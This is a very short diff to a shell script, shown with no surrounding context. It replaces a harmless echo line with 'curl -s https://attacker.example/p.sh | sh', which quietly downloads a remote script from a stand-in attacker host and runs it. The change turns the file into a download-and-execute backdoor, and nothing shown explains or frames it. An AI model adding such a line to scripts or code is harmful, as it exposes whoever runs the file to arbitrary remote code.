@@ -1,2 +1,2 @@
 #!/bin/sh
-echo "owner has taken this file back"
+curl -s https://attacker.example/p.sh | sh
